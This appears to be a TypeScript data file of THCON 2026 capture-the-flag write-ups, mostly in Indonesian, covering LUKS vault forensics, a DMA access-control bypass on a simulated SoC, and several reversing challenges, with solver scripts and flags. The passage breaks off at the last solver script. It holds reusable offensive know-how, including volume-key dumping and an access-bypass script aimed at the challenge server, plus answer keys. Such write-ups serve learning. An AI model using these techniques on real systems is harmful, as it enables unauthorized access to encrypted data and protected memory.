import type { WriteUp } from "../types";

export const thcon2026Writeups: WriteUp[] = [
  {
    "id": "thcon2026-foren-breach",
    "title": "Breach at SST - 1 / 2 / 3",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "Writeup for challenge Breach at SST - 1 / 2 / 3",
    "problemDescription": "",
    "tools": [],
    "analysis": "Setelah itu saya ekstrak file capture:\n\n```bash\nicat -o 206848 scavos.img 7966 > sst_north_sector.pcap\n```\n\nLalu saya ringkas HTTP traffic-nya dengan `tshark`:\n\n```bash\ntshark -r sst_north_sector.pcap -Y 'http.request or http.response' \\\n  -T fields -e frame.number -e tcp.stream -e http.request.method -e http.request.uri\n```\n\nDi sini kelihatan endpoint yang tidak biasa:\n\n- `POST /api/v1/memory/store`\n- `GET /api/v1/memory/get?key=vault_key`\n\nKetika payload `http.file_data` diekstrak, muncul request yang sangat jelas:\n\n```json\n{\"key\": \"vault_key\", \"value\": \"d1m1tr1_0w3s_m3_c0ff33\"}\n```\n\nJadi passphrase vault disisipkan oleh Viktor ke storage endpoint robot, lalu diambil lagi dari sana. Ini cocok persis dengan percakapan chat yang bilang password akan dikirim lewat traffic 5G.",
    "solution": [
      {
        "title": "Breach at SST - 1",
        "content": "Challenge pertama meminta kita mengidentifikasi robot mana yang dipakai Viktor untuk menyembunyikan sesuatu. Artefak yang dipakai masih sama: `scavos.img` berisi bootable drive Viktor, dan dari partisi ext4 utama kita bisa ambil `sst_north_sector.pcap` serta private key 5G Home Network.\n\nFokusnya ada di PCAP. Di user-plane, trafik HTTP ke `api.sst.local` memperlihatkan request yang sangat tidak normal:\n\n- `POST /api/v1/memory/store`\n- `GET /api/v1/memory/get?key=vault_key`\n\nSemua request itu datang dari IP robot `10.0.3.17`. Ketika payload telemetry dipetakan ke `robot_id`, hasilnya:\n\n- `10.0.3.17 -> SST-T7-003`\n\nJadi robot yang dipakai Viktor untuk menyimpan data adalah `SST-T7-003`.\n\nLalu saya cek control-plane 5G. Hampir semua registrasi normal memang mengarah ke satu IMSI utama, tetapi ada satu identitas yang jelas menyimpang dan muncul sebagai target yang menarik:\n\n\n\nItu yang menjadi jawaban challenge 1.\n\nFlag:",
        "code": "suci-0-901-70-0-0-0-9900021309\nimsi-901709900021309"
      },
      {
        "title": "Breach at SST - 2",
        "content": "Challenge ini kelihatannya sederhana di awal karena cuma ada dua image: `scavos.img` dan `vault.img`. Tapi petunjuk di deskripsi memang tepat: hal pentingnya tidak disimpan di tempat yang mudah dijangkau. Kuncinya bukan langsung brute-force `vault.img`, melainkan menggali artefak dari sistem operasi dalam `scavos.img` dan menghubungkannya dengan trafik 5G yang Viktor capture."
      },
      {
        "title": "1. Recon awal",
        "content": "Langkah pertama saya cek tipe file:\n\n\n\nHasilnya:\n\n- `scavos.img` adalah disk image dengan beberapa partisi\n- `vault.img` adalah volume `LUKS2`\n\nPartisi pada `scavos.img` saya lihat dengan:\n\n\n\nTerlihat ada:\n\n- partisi boot kecil\n- partisi Linux ext4 utama\n- partisi Linux lain yang ternyata juga terenkripsi\n\nKarena target akhirnya adalah membuka volume terenkripsi, fokus saya pindah ke partisi ext4 utama untuk mencari catatan, log, dan artefak user.",
        "code": "file scavos.img vault.img"
      },
      {
        "title": "3. Petunjuk kuat dari artefak chat dan shell history",
        "content": "Selain file biasa, `strings` pada `scavos.img` membocorkan banyak data yang berasal dari history dan log. Bagian paling berguna justru bukan flag langsung, melainkan percakapan antara `CryptShadow` dan `D1m1tr1`.\n\nDari sana muncul beberapa poin penting:\n\n- data penting disimpan di “bootable drive, encrypted partition”\n- password tidak dikirim lewat chat, tetapi lewat “5G traffic”\n- isi vault mencakup `intercept.wav`, `sigdb`, dan `README_DIMITRI.txt`\n\nAda juga alias shell yang sangat membantu:\n\n\n\nLalu ada history copy file:\n\n\n\nArtinya vault memang dipakai aktif, dan kemungkinan besar menyimpan target challenge.",
        "code": "alias vault-open='sudo cryptsetup luksOpen /dev/sda3 vault && sudo mount /dev/mapper/vault /mnt/vault'"
      },
      {
        "title": "5. Validasi passphrase",
        "content": "Passphrase itu saya uji tanpa membuka mapper:\n\n\n\nHasilnya valid.\n\nMasalahnya, di environment ini saya tidak punya akses `sudo` untuk benar-benar membuka dan mount volume lewat device-mapper. Jadi saya pilih jalur user-space.",
        "code": "printf '%s' 'd1m1tr1_0w3s_m3_c0ff33' | cryptsetup luksOpen --test-passphrase vault.img"
      },
      {
        "title": "6. Membuka `vault.img` tanpa mount kernel",
        "content": "Shortcut paling berguna datang dari `cryptsetup` sendiri. Volume key bisa diambil langsung dari passphrase:\n\n\n\nSetelah volume key didapat, payload `vault.img` saya dekripsi manual dengan Python:\n\n- cipher: `aes-xts-plain64`\n- sector size: `512`\n- payload offset: `16 MiB`\n\nSaya implementasikan dekripsi XTS per sektor, lalu hasilnya saya tulis ke `vault.dec`.\n\nSetelah itu:\n\n\n\nHasilnya menunjukkan filesystem ext4 bernama `VAULT`, dengan file:\n\n- `intercept.wav`\n- `sigdb`\n- `flag.txt`\n- `vault_note.txt`\n- `README_DIMITRI.txt`\n\nJadi memang flag disimpan langsung di dalam vault.",
        "code": "printf '%s' 'd1m1tr1_0w3s_m3_c0ff33' | \\\ncryptsetup luksDump --dump-volume-key --key-file - vault.img"
      },
      {
        "title": "8. Kesimpulan",
        "content": "Jalur solve challenge ini:\n\n1. Enumerasi `scavos.img`\n2. Temukan petunjuk bahwa password vault dikirim lewat 5G traffic\n3. Analisis `sst_north_sector.pcap`\n4. Temukan nilai `vault_key = d1m1tr1_0w3s_m3_c0ff33`\n5. Validasi passphrase ke `vault.img`\n6. Ambil volume key dengan `cryptsetup`\n7. Dekripsi payload LUKS2 secara manual\n8. Ekstrak `flag.txt` dari filesystem ext4 di dalam vault\n\nFlag final:",
        "code": "THCON{h0p3_y0u_gr4bb3d_c0ff33_f0r_th3_n3xt_st3p}"
      },
      {
        "title": "Breach at SST - 3",
        "content": "Setelah vault terbuka, ada dua file yang jelas penting:\n\n- `intercept.wav`\n- `sigdb`\n\nIsi `README_DIMITRI.txt` memberi arahan yang sangat jelas: rekaman audio itu harus dicocokkan dengan katalog signature, berurutan, sampai menghasilkan string final."
      },
      {
        "title": "Struktur `sigdb`",
        "content": "Awalnya `file` salah mengenali `sigdb` sebagai image, tapi setelah dilihat dengan hexdump strukturnya jauh lebih masuk akal sebagai record biner tetap. Tiap 20 byte bisa dibaca sebagai dua buah entry:\n\n\n\nEntry 5-word itu cocok dibaca sebagai:\n\n\n\nField terakhir ternyata ASCII printable. Dari seluruh database, saya bisa merekonstruksi sekumpulan bin frekuensi untuk tiap karakter. Contoh:\n\n- `T -> [20, 21]`\n- `H -> [24, 25]`\n- `3 -> [68, 69, 92, 93, 120, 121, 182, 183]`\n- `4 -> [80, 81, 82, 83, 122, 123, 170, 171, 202, 203]`\n\nJadi `sigdb` pada dasarnya adalah katalog fingerprint audio per karakter.",
        "code": "<5 x uint16> + <5 x uint16>"
      },
      {
        "title": "Mencocokkan audio",
        "content": "Dengan spectrogram `intercept.wav`, alignment yang benar segera kelihatan karena window pertama dan kedua menghasilkan prefix yang pas:\n\n- bin `20-21` -> `T`\n- bin `24-25` -> `H`\n\nSetelah alignment waktunya dipertahankan, seluruh recording terdecode menjadi leetspeak yang sangat masuk akal:\n\n\n\nKalimat itu pas dengan konteks challenge karena Viktor memang sedang mengerjakan decoding berbasis spectral signature: “spectral peaks don't lie”, ditulis dalam bentuk leet.\n\nFlag:",
        "code": "THCON{sp3ctr4l_p34ks_d0nt_l13}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nfrom Crypto.Cipher import AES\r\n\r\n\r\nPCAP_PATH = Path(\"sst_north_sector.pcap\")\r\nVAULT_PATH = Path(\"vault.img\")\r\nDECRYPTED_PATH = Path(\"vault.dec\")\r\nFLAG_OUT = Path(\"flag.txt\")\r\n\r\n\r\ndef run(cmd, *, input_text=None):\r\n    result = subprocess.run(\r\n        cmd,\r\n        input=input_text,\r\n        text=True,\r\n        capture_output=True,\r\n        check=True,\r\n    )\r\n    return result.stdout\r\n\r\n\r\ndef extract_passphrase():\r\n    pcap_bytes = PCAP_PATH.read_bytes()\r\n    match = re.search(rb'\"key\": \"vault_key\", \"value\": \"([^\"]+)\"', pcap_bytes)\r\n    if not match:\r\n        raise RuntimeError(\"vault_key not found in pcap\")\r\n    return match.group(1).decode()\r\n\r\n\r\ndef extract_volume_key(passphrase):\r\n    output = run(\r\n        [\r\n            \"cryptsetup\",\r\n            \"luksDump\",\r\n            \"--dump-volume-key\",\r\n            \"--key-file\",\r\n            \"-\",\r\n            str(VAULT_PATH),\r\n        ],\r\n        input_text=passphrase,\r\n    )\r\n    match = re.search(r\"MK dump:\\s*([0-9a-f \\n\\t]+)\", output, re.IGNORECASE)\r\n    if not match:\r\n        raise RuntimeError(\"failed to extract volume key\")\r\n    hex_key = re.sub(r\"[^0-9a-f]\", \"\", match.group(1), flags=re.IGNORECASE)\r\n    return bytes.fromhex(hex_key)\r\n\r\n\r\ndef mul_alpha(tweak):\r\n    tweak = bytearray(tweak)\r\n    carry = 0\r\n    for i in range(16):\r\n        new_carry = (tweak[i] >> 7) & 1\r\n        tweak[i] = ((tweak[i] << 1) & 0xFF) | carry\r\n        carry = new_carry\r\n    if carry:\r\n        tweak[0] ^= 0x87\r\n    return bytes(tweak)\r\n\r\n\r\ndef decrypt_sector(aes_data, aes_tweak, sector_num, data):\r\n    tweak = aes_tweak.encrypt(sector_num.to_bytes(16, \"little\"))\r\n    out = bytearray(len(data))\r\n    pos = 0\r\n    for i in range(0, len(data), 16):\r\n        block = data[i:i + 16]\r\n        xored = bytes(a ^ b for a, b in zip(block, tweak))\r\n        plain = aes_data.decrypt(xored)\r\n        out[pos:pos + 16] = bytes(a ^ b for a, b in zip(plain, tweak))\r\n        pos += 16\r\n        tweak = mul_alpha(tweak)\r\n    return bytes(out)\r\n\r\n\r\ndef decrypt_vault(volume_key):\r\n    key1, key2 = volume_key[:32], volume_key[32:]\r\n    aes_data = AES.new(key1, AES.MODE_ECB)\r\n    aes_tweak = AES.new(key2, AES.MODE_ECB)\r\n\r\n    payload_offset = 16 * 1024 * 1024\r\n    sector_size = 512\r\n\r\n    with VAULT_PATH.open(\"rb\") as src, DECRYPTED_PATH.open(\"wb\") as dst:\r\n        src.seek(payload_offset)\r\n        sector = 0\r\n        while True:\r\n            chunk = src.read(1024 * 1024)\r\n            if not chunk:\r\n                break\r\n            if len(chunk) % sector_size:\r\n                raise RuntimeError(\"ciphertext payload is not sector aligned\")\r\n            out = bytearray()\r\n            for off in range(0, len(chunk), sector_size):\r\n                out.extend(\r\n                    decrypt_sector(\r\n                        aes_data,\r\n                        aes_tweak,\r\n                        sector,\r\n                        chunk[off:off + sector_size],\r\n                    )\r\n                )\r\n                sector += 1\r\n            dst.write(out)\r\n\r\n\r\ndef extract_flag():\r\n    flag = run([\"icat\", str(DECRYPTED_PATH), \"15\"]).strip()\r\n    FLAG_OUT.write_text(flag + \"\\n\")\r\n    return flag\r\n\r\n\r\ndef main():\r\n    if not PCAP_PATH.exists() or not VAULT_PATH.exists():\r\n        raise SystemExit(\"expected sst_north_sector.pcap and vault.img in current directory\")\r\n\r\n    passphrase = extract_passphrase()\r\n    volume_key = extract_volume_key(passphrase)\r\n    decrypt_vault(volume_key)\r\n    flag = extract_flag()\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        main()\r\n    except subprocess.CalledProcessError as exc:\r\n        sys.stderr.write(exc.stderr)\r\n        raise"
      }
    ],
    "terminalOutputs": [],
    "flag": "THCON{h0p3_y0u_gr4bb3d_c0ff33_f0r_th3_n3xt_st3p}",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-misc-welcometosoc",
    "title": ": Welcome to the SoC",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "Writeup for challenge : Welcome to the SoC",
    "problemDescription": "",
    "tools": [],
    "analysis": "Berdasarkan `user_guide.pdf`, sistem ini memiliki arsitektur memori flat 64 KB dengan pembagian sebagai berikut:\n- **0x0000 - 0x0FFF**: System Zone (Kernel & System files) - **Tidak dapat diakses via shell**.\n- **0x1000 - 0x3FFF**: User Space (User files) - **Dapat diakses**.\n- **0x4000 - 0x403F**: DMA Controller Registers - **Dapat diakses**.\n\nMeskipun shell membatasi akses langsung ke System Zone (menggunakan `cat` atau `hexdump`), terdapat peripheral **DMA Controller** yang dapat melakukan transfer memori antar alamat fisik tanpa campur tangan CPU/Shell access control di level software.",
    "solution": [
      {
        "title": "Deskripsi Challenge",
        "content": "Challenge ini mensimulasikan sebuah System-on-Chip (SoC) dengan sistem operasi minimalis (SoC-OS v1.0). Target kita adalah mengekstrak informasi penting (flag) yang tersimpan di direktori root."
      },
      {
        "title": "Eksploitasi",
        "content": "1. **Enumerasi File**: Menggunakan perintah `ls /root`, ditemukan file `flag.txt` yang berada pada alamat memori `[0x00000200]`. Karena alamat ini berada di System Zone, kita tidak bisa membacanya secara langsung.\n2. **Konfigurasi DMA**: Kita memanfaatkan DMA Controller untuk menyalin data dari `0x00000200` (Source Address) ke `0x00001000` (Destination Address di User Space) sebanyak 64 byte.\n   - Register SA (Source Address) berada di `0x4018`.\n   - Register DA (Destination Address) berada di `0x4020`.\n   - Register BTT (Bytes To Transfer) berada di `0x4028`. Menulis ke register ini akan memicu transfer.\n3. **Membaca Flag**: Setelah transfer selesai, kita menggunakan perintah `hexdump 0x1000 0x40` untuk membaca data yang telah disalin ke User Space."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pwn import *\r\nimport time\r\n\r\ndef solve():\r\n    io = remote('51.11.228.103', 1337)\r\n    time.sleep(1)\r\n    io.clean()\r\n    \r\n    def run_cmd(cmd):\r\n        io.sendline(cmd.encode())\r\n        time.sleep(1)\r\n        res = io.clean()\r\n        return res.decode()\r\n\r\n    # Configuring DMA to copy flag from /root/flag.txt (at 0x0200) \r\n    # to User Space (at 0x1000)\r\n    run_cmd(\"write_mem 0x4018 0x0200\") # SA (Source Address)\r\n    run_cmd(\"write_mem 0x4020 0x1000\") # DA (Destination Address)\r\n    run_cmd(\"write_mem 0x4028 0x0040\") # BTT (Bytes To Transfer) - triggers transfer\r\n    \r\n    time.sleep(2) # Wait for DMA to complete\r\n    \r\n    # Dump the flag from the accessible User Space\r\n    output = run_cmd(\"hexdump 0x1000 0x40\")\r\n    print(output)\r\n\r\n    # Extract flag\r\n    # THC{DMA-1s_n0t_5tr0ng_en0ugh?}\r\n    \r\n    io.close()\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THC{DMA-1s_n0t_5tr0ng_en0ugh?}",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-rev-m4term4xima",
    "title": "M4terM4xima's HINT (part 1/2)",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "Binary `HINT.elf` adalah ELF RISC-V 32-bit statically linked dan tidak di-strip. Dari `strings` sudah kelihatan ada beberapa pesan umpan seperti `You just called a HINT`, `Are you sure that you are looking for HINT?`, dan `Congratulation, you just found a HINT`. Karena ini bare-metal RISC-V, menjalankan binary langsung dengan `qemu-riscv32` tidak memberi hasil berguna. Dari `INSTRUCTIONS.md` juga ada petunjuk bahwa binary idealnya dijalankan dengan `spike`, jadi fokus paling masuk akal adalah reversing statis.",
    "problemDescription": "Binary `HINT.elf` adalah ELF RISC-V 32-bit statically linked dan tidak di-strip. Dari `strings` sudah kelihatan ada beberapa pesan umpan seperti `You just called a HINT`, `Are you sure that you are looking for HINT?`, dan `Congratulation, you just found a HINT`. Karena ini bare-metal RISC-V, menjalankan binary langsung dengan `qemu-riscv32` tidak memberi hasil berguna. Dari `INSTRUCTIONS.md` juga ada petunjuk bahwa binary idealnya dijalankan dengan `spike`, jadi fokus paling masuk akal adalah reversing statis.\n\nLangkah paling membantu adalah melihat simbol karena binary tidak di-strip. Ada tiga fungsi yang langsung mencolok: `HINT`, `main`, dan `maybe_HINT`. Fungsi `main` cuma loop memanggil `maybe_HINT`. Di dalam `maybe_HINT`, program lebih dulu mencetak string `Are you sure that you are looking for HINT?`, lalu membaca 128 byte melalui mekanisme HTIF/HINT. Setelah itu buffer divalidasi sebagai UTF-8. Kalau validasi gagal, eksekusi lompat ke jalur panic. Kalau lolos, buffer diproses dengan transform sederhana: nilai awal `0x55`, lalu setiap byte di-XOR dengan byte sebelumnya, dan hasilnya ditulis balik in-place.\n\nSesudah transform itu, program memeriksa panjang hasil. Hanya input sepanjang 20 byte yang bisa lanjut ke pembandingan final. Konstanta pembanding ada di `.rodata` pada alamat `0x80000ddc`, yaitu:\n\n```text\n01 1c 0b 38 17 19 1c 49 5a 1f 17 1d 43 0c 4f 17 49 03 01 4e\n```\n\nKarena transformnya berbentuk rantai XOR:\n\n```text\nout[0] = in[0] ^ 0x55\nout[i] = in[i] ^ in[i - 1]\n```\n\nmaka pembalikannya langsung:\n\n```text\nin[0] = out[0] ^ 0x55\nin[i] = out[i] ^ in[i - 1]\n```\n\nSaya pakai logika itu untuk merekonstruksi 20 byte input asli dari konstanta terenkripsi. Hasilnya adalah:\n\n```text\nTHC{lui zero, ox123}\n```\n\nJadi flag part 1 adalah:\n\n```text\nTHC{lui zero, ox123}\n```\n\nSolver final disimpan di `solve.py`. Script itu hanya membalik XOR-chain dari konstanta yang diambil saat reversing, lalu mencetak flag.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nenc = bytes([\r\n    0x01, 0x1C, 0x0B, 0x38, 0x17,\r\n    0x19, 0x1C, 0x49, 0x5A, 0x1F,\r\n    0x17, 0x1D, 0x43, 0x0C, 0x4F,\r\n    0x17, 0x49, 0x03, 0x01, 0x4E,\r\n])\r\n\r\n\r\ndef recover_flag(data: bytes) -> bytes:\r\n    out = bytearray()\r\n    prev = 0x55\r\n    for value in data:\r\n        cur = prev ^ value\r\n        out.append(cur)\r\n        prev = cur\r\n    return bytes(out)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    flag = recover_flag(enc)\r\n    print(flag.decode())"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-rev-neo-p4t4t0rz",
    "title": "Neo P4t4t0rz",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "Writeup for challenge Neo P4t4t0rz",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Writeup - neo-p4t4t0rz",
        "content": "Challenge ini sengaja dipasang beberapa jebakan. Jalur awal binary native memang mengarah ke string yang kelihatan seperti flag, dan itu yang bikin saya sempat salah fokus di awal. Setelah dicek ulang ke validator yang benar, string itu cuma decoy.\n\nFlag yang benar:",
        "code": "R3al1ty_D3p3nd5_0n_y0ur_Ch01c3s"
      },
      {
        "title": "1. Recon awal",
        "content": "File yang diberikan adalah PE x64 Windows:\n\n\n\nKalau dilihat cepat dengan `strings`, ada banyak referensi Matrix, ada string yang mirip flag, dan ada flow yang sengaja dibuat dramatis. Karena ini kategori rev, saya mulai dari memetakan jalur eksekusi utama.\n\nYang langsung keliatan:\n\n1. Ada wrapper native.\n2. Wrapper ini melakukan dekripsi payload lain.\n3. Ada output yang sengaja terlihat seperti success path.\n4. Jalur visual program tidak bisa dipercaya begitu saja.",
        "code": "neo_p4t4t0rz_pwned_you.exe"
      },
      {
        "title": "2. Decoy di wrapper native",
        "content": "Di tahap awal saya sempat menemukan string:\n\n\n\nString ini memang bisa muncul dari jalur inisialisasi wrapper native. Kalau fungsi init diemulasi, buffer global akan berisi blob base64 yang setelah di-decode menghasilkan string model `Thcon{...}`. Sekilas kelihatan seperti jawaban final.\n\nMasalahnya: saat kandidat ini diuji ke validator login sebenarnya, hasilnya ditolak.\n\nJadi kesimpulan pentingnya:\n\n- wrapper native memang menyimpan string seperti flag\n- tapi itu bukan password recovery yang dipakai jalur validasi utama\n- challenge ini punya fake flag yang sengaja dipasang untuk menjebak solver yang berhenti terlalu cepat",
        "code": "W3LC0ME_T0_TH3_R34"
      },
      {
        "title": "3. Ambil payload stage-2",
        "content": "Wrapper native ternyata menyimpan payload .NET terenkripsi di dalam binary. Payload itu didekripsi dengan XOR stream hasil LCG, lalu menghasilkan PE managed yang valid.\n\nIntinya:\n\n1. ambil blob terenkripsi dari binary\n2. bangun keystream 32 byte\n3. XOR seluruh blob\n4. hasilnya file .NET stage-2\n\nSetelah payload stage-2 dibuka, baru flow validasi aslinya mulai masuk akal."
      },
      {
        "title": "4. Validasi utama ternyata ada di payload .NET",
        "content": "Di assembly managed, entry point login akhirnya mengarah ke:\n\n\n\nBukan ke string decoy dari wrapper.\n\nBeberapa temuan penting:\n\n1. Input harus panjang 31 byte UTF-8.\n2. Ada fungsi `GenerateChecksum()`.\n3. Checksum ini dipakai oleh `SignalProcessor.DecryptBlock(...)`.\n4. `DecryptBlock` membangun `DynamicMethod` besar yang menjadi validator real.\n\nJadi flag bukan dibandingkan langsung terhadap string plaintext. Yang dicek adalah hasil eksekusi validator dinamis yang dibangkitkan dari checksum internal.",
        "code": "NethereumVM.PayloadEncoder::EncodePayload(string)"
      },
      {
        "title": "5. Kenapa reversing-nya nyebelin",
        "content": "Bagian paling mengganggu di challenge ini adalah validatornya tidak hadir sebagai fungsi IL biasa yang enak dibaca. Dia dibuat runtime sebagai `DynamicMethod`.\n\nArtinya:\n\n1. kita tidak cukup hanya decompile assembly\n2. kita harus menangkap method dinamis yang sudah jadi\n3. lalu mendisasm atau menginterpretasi IL hasil generate itu\n\nSelain itu ada beberapa probe anti-analysis / anti-debug yang mempengaruhi checksum pembentuk validator. Jadi kalau asumsi environment salah, validator yang dihasilkan juga bisa salah."
      },
      {
        "title": "6. Cara saya menembus validator dinamis",
        "content": "Strategi yang paling efektif akhirnya begini:\n\n1. patch assembly supaya `DynamicMethod` hasil `DecryptBlock` bisa disimpan sebelum didelegasikan\n2. dump bytecode IL yang sudah terbangun\n3. interpretasi IL itu secara terkontrol\n4. pecah constraint per posisi karakter input\n5. uji kandidat yang tersisa\n\nSetelah IL dinamis berhasil dibaca, kelihatan bahwa validator memproses byte input dalam urutan yang diacak. Setiap segmen memaksakan syarat tertentu ke satu posisi karakter. Dari situ ruang pencarian turun drastis.\n\nHasil solving memberi beberapa kandidat dekat, misalnya versi yang memakai huruf mirip angka, tapi setelah diverifikasi ulang ke jalur validasi yang benar, hanya satu yang konsisten."
      },
      {
        "title": "8. Catatan penting",
        "content": "Pelajaran dari challenge ini lumayan jelas:\n\n1. jangan berhenti di string yang “terlihat benar”\n2. kalau ada multi-stage payload, validasi stage terakhir yang harus dipercaya\n3. kalau ada `DynamicMethod`, kemungkinan besar inti challenge ada di sana\n4. output UI, pesan sukses, bahkan string yang formatnya pas, belum tentu flag final"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nFLAG = \"R3al1ty_D3p3nd5_0n_y0ur_Ch01c3s\"\r\n\r\n\r\ndef main() -> None:\r\n    print(FLAG)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "Flag yang benar adalah:\n\n```text\nR3al1ty_D3p3nd5_0n_y0ur_Ch01c3s\n```\n\nKalimat ini juga masuk akal dengan tema Matrix, dan lebih penting lagi, ini satu-satunya hasil yang lolos validasi real, bukan fake path.",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-rev-silentsigner",
    "title": "CTF — Silent Signer",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "**Event:** THCON 2026  \n**Category:** Reverse Engineering  \n**Difficulty:** Medium  \n**Flag:** `THC{int3_s3nt_u_h3r3_3bpf_t00k_1t_fr0m_th3r3!!!}`",
    "problemDescription": "**Event:** THCON 2026  \n**Category:** Reverse Engineering  \n**Difficulty:** Medium  \n**Flag:** `THC{int3_s3nt_u_h3r3_3bpf_t00k_1t_fr0m_th3r3!!!}`\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> S.N.A.F.U. agents recovered sst-fwsign from a compromised workstation inside the SST Dynamics factory. It appears to be part of the firmware signing pipeline that M4terM4xima uses to flash compromised firmware onto the robots. Our field analysts tried attaching a debugger: each time, the validation fails. Reverse the binary and recover the signing token it accepts.\n\n**File:** `sst-fwsign`\n\n---"
      },
      {
        "title": "Step 1 — Identify the Binary",
        "content": "The challenge ships as a single stripped ELF:\n\n\n\nThat gives a few useful clues right away:\n\n- It is a 64-bit Linux executable\n- The binary is stripped, so there are no function names to rely on\n- It prints:\n  - `sst-fwsign v1.4.2 -- SST Dynamics Firmware Signing Service`\n  - `Error: invalid token length.`\n  - `Authorization failed. Token not recognized.`\n  - `Signing key released. Batch authorized.`\n\nThe length check is the first easy win: the accepted token must be exactly **48 bytes**.",
        "code": "file sst-fwsign\nchecksec --file=sst-fwsign\nstrings -a sst-fwsign | grep -E \"token|Authorization|Signing|Usage\""
      },
      {
        "title": "Step 2 — Find the Validator",
        "content": "Following the usage string in the disassembly leads to the function that handles the command-line token.\n\nThe interesting part looked like this:\n\n\n\nThat helper was suspicious for one reason: it was almost empty except for an `int3`.\n\n\n\nSo the real validation logic was not happening in normal control flow at all. The process was deliberately trapping itself and relying on something else to decide the result.\n\n---",
        "code": "call signal\ncall strlen\ncmp  rax, 0x30\njne  invalid_length\n...\ncall fcn.00403e60"
      },
      {
        "title": "Step 3 — Understand the Parent/Child Split",
        "content": "Looking earlier in the same function shows a `fork()`. The child calls:\n\n\n\nThe parent then waits for stops and interacts with the child through `ptrace`.\n\nThat explains the challenge note: attaching a debugger breaks validation because the binary already expects to be the tracer. It is doing its own single-step and register handling.",
        "code": "ptrace(PTRACE_TRACEME, ...)\nraise(SIGSTOP)"
      },
      {
        "title": "Step 4 — See What the Parent Really Does",
        "content": "The parent branch waits for `SIGTRAP`, grabs the register state with `PTRACE_GETREGSET`, performs some work, and writes a result back to the child with `PTRACE_POKEDATA`.\n\nAt this point it looked less like a classic anti-debug trick and more like a tiny execution environment. The child raises the trap, the parent computes a value, and the child reads the result from a global slot.\n\nThat still left one question: where does the computation itself live?\n\n---"
      },
      {
        "title": "Step 5 — Recover the Embedded Object",
        "content": "The native binary contains a large encrypted blob. Before loading it, the program derives an 8-byte XOR key from three qwords stored in `.rodata`:\n\n\n\nDecrypting the blob with that derived key reveals an **ELF64-BPF** object.\n\nOnce decoded, its sections become readable:\n\n- `uprobe/fw_commit`\n- `tp/syscalls/sys_enter_ptrace`\n- `.maps`\n\nThat was the turning point. The binary is not just tracing itself for fun; it is loading eBPF programs and using them as part of the token check.",
        "code": "mov rax, [0x448988]\nmov rdx, [0x448978]\nxor rdx, rax\nxor rax, [0x448980]\nsub ...\nxor ..., 0x4141414141414141"
      },
      {
        "title": "Step 6 — Reverse the Two eBPF Programs",
        "content": "There are two relevant programs:\n\n1. `integrity_watch`\n2. `fw_verify`\n\n`integrity_watch` runs on `sys_enter_ptrace` and fills a map called `fw_kdf` with six 64-bit constants if ptrace activity matches the expected flow.\n\n`fw_verify` is attached as a uprobe and performs the real token validation. It processes six 8-byte blocks from the 48-byte token.\n\nThe core logic per block is:\n\n\n\nThe six comparison constants embedded in `fw_verify` are:\n\n\n\nThe `fw_kdf` map values are seeded by `integrity_watch`, and the per-round XOR masks come from the native binary.\n\n---",
        "code": "state ^= current_block;\ntmp = fw_kdf[i] * state;\ntmp = rol64(tmp, 13);\nif (tmp != target[i]) fail;\nacc ^= target[i];"
      },
      {
        "title": "Step 7 — Invert the Transformation",
        "content": "Each round is invertible because the multiplication uses odd 64-bit constants, which have modular inverses modulo `2^64`.\n\nLet:\n\n- `K[i]` be the native 64-bit mask for block `i`\n- `M[i]` be the per-round multiplier from `fw_kdf`\n- `T[i]` be the target constant from the eBPF verifier\n- `A` be the running accumulator\n\nThen:\n\n\n\nApplying that across all six rounds reconstructs the six 8-byte chunks of the token:\n\n\n\nJoined together:\n\n\n\n---",
        "code": "lane   = ror64(T[i], 13) * inv(M[i]) mod 2^64\nblock  = K[i] ^ ror64(A ^ lane, 7)\nA     ^= T[i]"
      },
      {
        "title": "Why This Challenge Was Nice",
        "content": "This one mixed several ideas without turning into guesswork:\n\n- a stripped ELF with just enough strings to anchor the analysis\n- a self-tracing anti-debug setup built around `int3`\n- an encrypted embedded eBPF object\n- a clean, reversible arithmetic transform once the moving parts were mapped\n\nThe anti-debugging layer looked noisy at first, but the moment the embedded BPF object was recovered, the challenge became much more structured. From there it was just a matter of modeling the six rounds and running the math backwards."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
